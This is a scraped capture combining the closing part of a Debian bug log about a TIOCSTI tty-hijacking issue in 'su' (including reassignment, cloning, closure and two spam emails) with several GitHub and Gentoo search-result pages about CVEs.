(Wed, 08 Aug 2018 20:30:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=304), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=304), [link](#303)).

---

**Acknowledgement sent**
to `Chris Hofstaedtler <zeha@debian.org>`:

Extra info received and filed, but not forwarded.
(Wed, 08 Aug 2018 20:30:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=306), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=306), [link](#305)).

---

[Message #307](#307) received at 628843-quiet@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=307), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=307), reply):

![](/cgi-bin/libravatar.cgi?email=zeha%40debian.org)
From: Chris Hofstaedtler <zeha@debian.org>
To: 628843-quiet@bugs.debian.org
Cc: carnil@debian.org
Subject: Re: #628843: reassign back to shadow
Date: Wed, 8 Aug 2018 22:27:50 +0200
```
Control: reassign 628843 src:shadow
Control: found 628843 1:4.1.4.2+svn3283-1
Control: found 628843 1:4.2-3+deb8u1
Control: notfound 628843 1:4.5-1.1
Control: clone 628843 -2 util-linux
Control: found -2 2.32-0.4
Control: notfound -2 2.32-0.3
Control: retitle -2 util-linux: tty hijacking possible in "su" via TIOCSTI ioctl

Reassigning this back to src:shadow, as it's used as the security
tracking bug. I was going to close this "su" from src:util-linux,
but turns out this is not fixed there either.

```

---

**Bug reassigned from package '[util-linux](pkgreport.cgi?package=util-linux)' to '[src:shadow](pkgreport.cgi?src=shadow)'.**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `628843-quiet@bugs.debian.org`.
(Wed, 08 Aug 2018 20:30:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=309), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=309), [link](#308)).

---

**Marked as found in versions shadow/1:4.1.4.2+svn3283-1.**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `628843-quiet@bugs.debian.org`.
(Wed, 08 Aug 2018 20:30:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=311), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=311), [link](#310)).

---

**Marked as found in versions shadow/1:4.2-3+deb8u1.**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `628843-quiet@bugs.debian.org`.
(Wed, 08 Aug 2018 20:30:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=313), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=313), [link](#312)).

---

**Bug [628843](bugreport.cgi?bug=628843) cloned as bug [905745](bugreport.cgi?bug=905745)**
Request was from `Chris Hofstaedtler <zeha@debian.org>`
to `control@bugs.debian.org`.
(Wed, 08 Aug 2018 20:51:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=315), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=315), [link](#314)).

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `src:shadow`.
(Tue, 10 Sep 2019 09:09:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=317), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=317), [link](#316)).

---

**Acknowledgement sent**
to `dir.chen19@gmail.com`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Tue, 10 Sep 2019 09:09:03 GMT) ([full text](bugreport.cgi?bug=628843;msg=319), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=319), [link](#318)).

---

[Message #320](#320) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=320), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=320), reply):

![](/cgi-bin/libravatar.cgi?email=gresiduo.hmr%40epdvr.com.br)
From: gresiduo.hmr@epdvr.com.br
To: undisclosed-recipients:;
Subject: Fwd: Re
Date: Tue, 10 Sep 2019 05:32:11 -0300
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=320) (text/plain, inline)]
```
```
We Need To Talk Please

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=320) (text/html, inline)]
```
```
[[Message part 3](bugreport.cgi?att=2;bug=628843;msg=320) (text/plain, inline)]
```
```

We Need To Talk Please

```
```
[[Message part 4](bugreport.cgi?att=3;bug=628843;msg=320) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `src:shadow`.
(Wed, 25 Aug 2021 09:45:05 GMT) ([full text](bugreport.cgi?bug=628843;msg=322), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=322), [link](#321)).

---

[Message #323](#323) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=323), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=323), reply):

![](/cgi-bin/libravatar.cgi?email=contact%40srv1.emaildnsservice.com)
From: "CARDOZE Y LINDO S.A." <contact@srv1.emaildnsservice.com>
To: "628843@bugs.debian.org" <628843@bugs.debian.org>
Subject: Trabaje seguro y adquiera repuestos de la mejor calidad, Tu equipo
100% ORIGINAL
Date: Wed, 25 Aug 2021 09:30:10 +0000
```
[[Message part 1](bugreport.cgi?att=0;bug=628843;msg=323) (text/plain, inline)]
```
```
*|MC_PREVIEW_TEXT|*
Cardoze & Lindo trae para ustedes la gama más grande de repuestos y
marcas reconocidas del mercado.

<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/46c59b2e8f2be153f5bb1fddbe216d36b2e7d2cf>
EQUIPO PESADO
Si eres el dueño de equipo pesado y buscas repuestos de reemplazo
para tu equipo. Aquí encontraras todo para: Excavadoras, Camiones,
Cargadores, Minicargadores y Retroexcavadoras.
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/454cedcea70579dd74840b1f72ddf2a1f37a5c18>
CAMIONES
Nosotros sabemos lo importante que es conservar tu camion
rodando; así que te ofrecemos una variedad de repuestos de calidad
para: Camiones Americanos, Autobuses y Vehículos de cargas de las
marcas más reconocidas.

<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/93f0fb85cce5a26702d4b2c83314a5f82f08538e>
EQUIPOS AGRÍCOLAS
Pensando en el agricultor panameño, tenemos una variedad
de soluciones desde la siembra hasta la cosecha, surcos y arado.
Somos su aliado perfecto para comprar sus repuestos New Holland®️y
Baldan®️

<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/11e6f74a21e285100605c19fbc7a22bf3914a59c>
EQUIPO PESADO NUEVO O USADO
Para reactivar la economía del país y el sector
construcción, contamos con inventario disponible de equipo pesado,
grúas, plantas eléctricas, concreteras; entre otros.

Para mayor información en disponibilidad y precio consúltenos a
través de nuestra página web o de la central telefónica.

Contáctenos
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/4ef2575739a99b27c13b989119ed3565ec0d4966>

PROMOCIÓN PARA MANTENIMIENTO PARA MOTORES DIESEL
PROMOCIÓN PARA MANTENIMIENTO LIGERO PARA CAMIONES
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/c69300b49d07b52cbb006493112977ae4fc4a0bb>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/1f60ab4afab139d1f74129f3a0f77b7f8070de48>
MANTENTE INFORMADO CON NUESTRO BLOG
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/1a194c2e5a727fc78244f8f64b56d6fa7680ae07>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/8f181b8c2ed3bbcbab81fe7764f5cb801c375c94>
LOS EQUIPOS DE CONSTRUCCIÓN Y SU VITAL IMPORTANCIA
APROVECHA AL MÁXIMO TU TRACTOR T7 DE NEW HOLLAND
El avance tecnológico es una necesidad de todos los sectores, y esto
es válido también para el..
El T7 Heavy Duty de New Holland es un verdadero tractor
agrícola.

Visítenos en nuestra pagina web CARDOZEYLINDO.com
En Cardoze & Lindo estamos comprometidos con nuestros clientes,
somos una empresa 100% panameña, y desde 1919 hemos estado presente
en el desarrollo de nuestro país.
* Nuestra Historia
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/b0a39ba69718bc1af98c4bcf9384bc5aafe20b9d>
* Proyectos Realizados
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/fb488355f2319e93d92d3df6670eecd4211956b6>
* Centro de Servicio
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/cd5e24359c68e97e24bed6b78522ba1d682b61db>
* Venta de Repuestos
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/4ef2575739a99b27c13b989119ed3565ec0d4966>
* Costrucción | JCB
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/315ce5e01e56e9cfd825e026fcd6824b8b484ed9>
* Transporte | International
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/090f2d349522dc3897d7b7fbcc69d8a6072d43e6>
* Agricultura | New Holland
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/c796b02e05686ac7e6e9ae561e28de5dd44f088b>
* Alquiler y Usados
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/1d9a3d1eaf8a2c9787291e54760c3d3efebff007>
Horario de atención:
lunes a viernes de las 8am a 4:30pm. sab. 8am 12pm
Teléfonos:
274-9700
(Whatsapp) 6673-1856
Visitar sitio web!
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/5b7f88a73934d85b81882cd4078b2b4044c04bfe>

<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/3650fe20fbd0d7dd69539fe5c59e81eec233d72c>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/832a5c5e54a64f612251bf565c9dc265d3674cb7>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/b2f2a72d650eba98a75389488781b8b9c12ede2e>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/5b7f88a73934d85b81882cd4078b2b4044c04bfe>
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/d1227957bf87d91e89cad589d706182c9c49d7bc>
Si no desea recibir correos nuestros por favor haga clic aquí
<https://link.emaildnsservice.com/index.php/campaigns/ae917xlv2ja96/track-url/nq466mr97pa53/007042244ff1fb09887285329ae12c98c773d90f>.

```
```
[[Message part 2](bugreport.cgi?att=1;bug=628843;msg=323) (text/html, inline)]
```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#628843`; Package `src:shadow`.
(Thu, 27 Apr 2023 09:27:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=325), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=325), [link](#324)).

---

**Acknowledgement sent**
to `Sam Morris <sam@robots.org.uk>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Thu, 27 Apr 2023 09:27:06 GMT) ([full text](bugreport.cgi?bug=628843;msg=327), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=327), [link](#326)).

---

[Message #328](#328) received at 628843@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=328), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=328), reply):

![](/cgi-bin/libravatar.cgi?email=sam%40robots.org.uk)
From: Sam Morris <sam@robots.org.uk>
To: Debian Bug Tracking System <628843@bugs.debian.org>
Subject: Re: login: tty hijacking possible in "su" via TIOCSTI ioctl
Date: Thu, 27 Apr 2023 10:01:09 +0100
```
Source: shadow
Followup-For: Bug #628843

-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA256

su/runuser are provided by util-linux these days. Can this bug be
closed?

- -- System Information:
Debian Release: 12.0
  APT prefers testing
  APT policy: (530, 'testing'), (520, 'unstable'), (500, 'testing-security'), (1, 'experimental')
Architecture: amd64 (x86_64)

Kernel: Linux 6.1.0-7-amd64 (SMP w/2 CPU threads; PREEMPT)
Locale: LANG=en_GB.UTF-8, LC_CTYPE=en_GB.UTF-8 (charmap=UTF-8), LANGUAGE not set
Shell: /bin/sh linked to /usr/bin/dash
Init: systemd (via /run/systemd/system)
LSM: AppArmor: enabled

-----BEGIN PGP SIGNATURE-----

iIgEARYIADAWIQTWOGqGn6HETecdzqZOEaKLhlAYigUCZEo5zxIcc2FtQHJvYm90
cy5vcmcudWsACgkQThGii4ZQGIrPXQD/cwQDVq34zy/KZ0iOzcsQGfwUYiCrycss
qdxSuGlBoiEBANAB1vhWhZVyDYG5e/E8qrYXKMiVvOW+G7UxvH+tXaEM
=oCdS
-----END PGP SIGNATURE-----

```

---

**Reply sent**
to `Jakub Wilk <jwilk@jwilk.net>`:

You have taken responsibility.
(Sat, 29 Apr 2023 19:54:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=330), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=330), [link](#329)).

---

**Notification sent**
to `Daniel Ruoso <daniel@ruoso.com>`:

Bug acknowledged by developer.
(Sat, 29 Apr 2023 19:54:04 GMT) ([full text](bugreport.cgi?bug=628843;msg=332), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=332), [link](#331)).

---

[Message #333](#333) received at 628843-done@bugs.debian.org ([full text](bugreport.cgi?bug=628843;msg=333), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=333), reply):

![](/cgi-bin/libravatar.cgi?email=jwilk%40jwilk.net)
From: Jakub Wilk <jwilk@jwilk.net>
To: Sam Morris <sam@robots.org.uk>, 628843-done@bugs.debian.org
Subject: Re: Bug#628843: login: tty hijacking possible in "su" via TIOCSTI
ioctl
Date: Sat, 29 Apr 2023 21:51:16 +0200
```
Version: 1:4.5-1.1

* Sam Morris <sam@robots.org.uk>, 2023-04-27 10:01:
>su/runuser are provided by util-linux these days. Can this bug be
>closed?

Let's close it in favor of #905745.

--
Jakub Wilk

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 28 May 2023 07:28:53 GMT) ([full text](bugreport.cgi?bug=628843;msg=335), [mbox](bugreport.cgi?bug=628843;mbox=yes;msg=335), [link](#334)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=628843).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sun Jan 26 05:00:31 2025;
Machine Name:
bembo

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from github.com_dbaec244_20250126_050020.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-200)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-200

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-200)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2Fsearch&source=header)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# issues Search Results · "CVE-200

## Filter by

* + [Code... (...)results](https://github.com/search?type=code&q=%22CVE-200)
  + [Repositoriesresults](https://github.com/search?type=repositories&q=%22CVE-200)
  + [Issuesresults](https://github.com/search?type=issues&q=%22CVE-200)
  + [Pull requestsresults](https://github.com/search?type=pullrequests&q=%22CVE-200)
  + [Discussionsresults](https://github.com/search?type=discussions&q=%22CVE-200)
  + [Usersresults](https://github.com/search?type=users&q=%22CVE-200)
  + More
* ### State

  + [Open](https://github.com/search?type=Issues&q=%22CVE-200&state=open)
  + [Closed](https://github.com/search?type=Issues&q=%22CVE-200&state=closed)
* ### Advanced

  + Owner
  + State
  + Close reason
  + [Has linked pull request](https://github.com/search?type=Issues&q=%22CVE-200+linked%3Apr)
  + Author
  + Assignee
  + Mentioned user
  + Mentioned team
  + Commenter
  + Involved user
  + Label
  + Milestone
  + Number of comments
  + Number of interactions
* [Advanced search](https://github.com/search/advanced)
Issues0 (0)0 results  (80 ms)
## 0 results

Sort by:  Best matchFilter
### [repology/repology-rs](/repology/repology-rs)[*CVE* display limited to *200*](/repology/repology-rs/issues/70)

Needs triage

* ![](https://avatars.githubusercontent.com/u/1125622?s=48&v=4)jrmarino
·* 1
·* Opened  on Nov 1, 2020
·* [#70](/repology/repology-rs/issues/70)
### [projectdiscovery/nuclei-templates](/projectdiscovery/nuclei-templates)[[FALSE-POSITIVE] *CVE*-2024-4439](/projectdiscovery/nuclei-templates/issues/11496)

false-positive

* ![](https://avatars.githubusercontent.com/u/93918469?s=48&v=4)KristinnVikar
·* Opened  9 days ago
·* [#11496](/projectdiscovery/nuclei-templates/issues/11496)
### [projectdiscovery/nuclei-templates](/projectdiscovery/nuclei-templates)[False Positive because of poor validation in: *CVE*-2020-0618](/projectdiscovery/nuclei-templates/issues/11498)

false-positive

* ![](https://avatars.githubusercontent.com/u/102229967?s=48&v=4)53n4d
·* Opened  8 days ago
·* [#11498](/projectdiscovery/nuclei-templates/issues/11498)
### [splunk/splunk-library-javalogging](/splunk/splunk-library-javalogging)[*CVE*-2022-32151 and *CVE*-2022-32158 in Version 1.11.8](/splunk/splunk-library-javalogging/issues/291)

We are currently using version 1.11.8 of the Splunk Java Logging Library and have identified two critical
vulnerabilities: *CVE*-2022-32151 and *CVE*-2022-32158. Could you please provide if there is an updated version that
addresses these issues or the timeline for the fix for this?

* ![](https://avatars.githubusercontent.com/u/37266319?s=48&v=4)beardo-sid
·* 4
·* Opened  on Oct 21, 2024
·* [#291](/splunk/splunk-library-javalogging/issues/291)
### [e-m-b-a/emba](/e-m-b-a/emba)[*cve*-bin-tool supported](/e-m-b-a/emba/issues/1439)

The *CVE* Binary Tool helps you determine if your system includes known vulnerabilities. You can scan binaries for
over *200* common, vulnerable components (openssl, libpng, libxml2, expat and others)。
EMBAhelp wantedquestion

* ![](https://avatars.githubusercontent.com/u/7598892?s=48&v=4)beruhan
·* 8
·* Opened  8 days ago
·* [#1439](/e-m-b-a/emba/issues/1439)
### [amaybaum-prod/camunda-message-streaming](/amaybaum-prod/camunda-message-streaming)[h2-1.4.*200*.jar: 3 vulnerabilities (highest severity is: 9.8) unreachable](/amaybaum-prod/camunda-message-streaming/issues/6)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/30796?s=48&v=4)mend-for-github-com[bot]
·* Opened  on Dec 18, 2024
·* [#6](/amaybaum-prod/camunda-message-streaming/issues/6)
### [tenable/integration-jira-cloud](/tenable/integration-jira-cloud)[Cannot be set, It is not on the appropriate screen,](/tenable/integration-jira-cloud/issues/306)

* ![](https://avatars.githubusercontent.com/u/90499807?s=48&v=4)Abudosh7
·* Opened  25 days ago
·* [#306](/tenable/integration-jira-cloud/issues/306)
### [symfony/symfony](/symfony/symfony)[Range Requests are not correctly handled for streaming large files](/symfony/symfony/issues/59159)

Symfony version(s) affected
6.4.x
Description
BinaryFileResponse returns Status *200* and no Content-Length or Content-Range headers when sending a request with Range:
bytes=0- . I have a controller ...BugHttpFoundationStatus: Needs Review

* ![](https://avatars.githubusercontent.com/u/11943872?s=48&v=4)bogdan-dinu-me
·* 2
·* Opened  on Dec 10, 2024
·* [#59159](/symfony/symfony/issues/59159)
### [CVEProject/cve-schema](/CVEProject/cve-schema)[5.1.0 accepts "version" wildcarding](/CVEProject/cve-schema/issues/337)

bugNeeds Discussionsection:affected\_product

* ![](https://avatars.githubusercontent.com/u/44594610?s=48&v=4)ElectricNroff
·* Opened  on Aug 29, 2024
·* [#337](/CVEProject/cve-schema/issues/337)
### [HoangBachLeLe/SalesTaxes](/HoangBachLeLe/SalesTaxes)[*CVE*-2021-42392 (Critical) detected in h2-1.4.*200*.jar](/HoangBachLeLe/SalesTaxes/issues/11)

Mend: dependency security vulnerability

* ![](https://avatars.githubusercontent.com/in/16809?s=48&v=4)mend-bolt-for-github[bot]
·* 2
·* Opened  on Feb 1, 2022
·* [#11](/HoangBachLeLe/SalesTaxes/issues/11)
Previous[1](https://github.com/search?type=Issues&q=%22CVE-200&p=1)[2](https://github.com/search?type=Issues&q=%22CVE-200&p=2)[3](https://github.com/search?type=Issues&q=%22CVE-200&p=3)[4](https://github.com/search?type=Issues&q=%22CVE-200&p=4)[5](https://github.com/search?type=Issues&q=%22CVE-200&p=5)[6](https://github.com/search?type=Issues&q=%22CVE-200&p=6)…[100](https://github.com/search?type=Issues&q=%22CVE-200&p=100)[Next](https://github.com/search?type=Issues&q=%22CVE-200&p=2)![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Restrict your search to the title by using the in:title qualifier.![Issue origami icon](/images/modules/search/issues.png)
## Learn how you can use GitHub Issues to plan and track your work.

Save views for sprints, backlogs, teams, or releases. Rank, sort, and filter issues to suit the occasion. The possibilities are endless.[Learn more about GitHub Issues](https://docs.github.com/issues) ProTip! Press the / key to activate the search input again and adjust your query.

You can’t perform that action at this time.



=== Content from bugs.gentoo.org_17ede754_20250126_050021.html ===

[![Gentoo Websites Logo](extensions/Gentoo/web/gentoo_org.png)](/ "Go to the Gentoo Bugzilla homepage")
Go to:
[Gentoo Home](https://www.gentoo.org/)
[Documentation](https://www.gentoo.org/support/documentation/)
[Forums](https://forums.gentoo.org/)
[Lists](https://www.gentoo.org/get-involved/mailing-lists/)
[Bugs](/)
[Planet](https://planet.gentoo.org/)
[Store](https://www.gentoo.org/inside-gentoo/stores/)
[Wiki](https://wiki.gentoo.org/)
**[Get Gentoo!](https://www.gentoo.org/downloads/)**

Gentoo's Bugzilla – Invalid Bug ID

* [Home](./)
* | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
* | [Browse](describecomponents.cgi)
* | [Search](query.cgi)
* | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
* |

  [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
* | [Reports](report.cgi)
* |
  [Requests](request.cgi)
* |
  [New Account](createaccount.cgi)
* |
  [Log In](show_bug.cgi?id=CVE&GoAheadAndLogIn=1)

  [x]
* |
  [Forgot Password](show_bug.cgi?id=CVE&GoAheadAndLogIn=1#forgot)
  Login:

  [x]

'CVE' is not a valid bug number
nor an alias to a bug.

Please press **Back** and try again.

* + [Home](./)
  + | [New](enter_bug.cgi?format=guided)–[[Ex]](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + | [Privacy Policy](https://wiki.gentoo.org/wiki/Foundation%3APrivacy_Policy)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [New Account](createaccount.cgi)
  + |
    [Log In](show_bug.cgi?id=CVE&GoAheadAndLogIn=1)

    [x]
  + |
    [Forgot Password](show_bug.cgi?id=CVE&GoAheadAndLogIn=1#forgot)
    Login:

    [x]



=== Content from github.com_8466d528_20250126_050044.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2Fsearch%3Ftype%3DIssues%26q%3D%2522CVE-2005-4890%2522)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

"CVE-2005-4890"

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

